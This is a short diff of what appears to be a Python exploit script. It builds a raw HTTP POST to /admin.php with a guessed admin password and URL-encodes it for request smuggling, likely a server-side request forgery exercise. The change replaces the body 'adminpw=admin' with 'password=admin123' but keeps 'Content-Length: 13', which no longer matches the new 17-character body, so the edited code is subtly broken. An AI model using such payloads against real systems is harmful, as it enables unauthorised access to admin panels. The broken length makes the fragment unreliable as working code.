@@ -5,7 +5,7 @@ payload = ("POST /admin.php HTTP/1.1\r\n"
            "Content-Length: 13\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "\r\n"
-           "adminpw=admin")
+           "password=admin123")
 
 # 1) First pass: keep / and : so /admin.php and header colons stay readable
 enc1 = quote(payload, safe="/-._:")
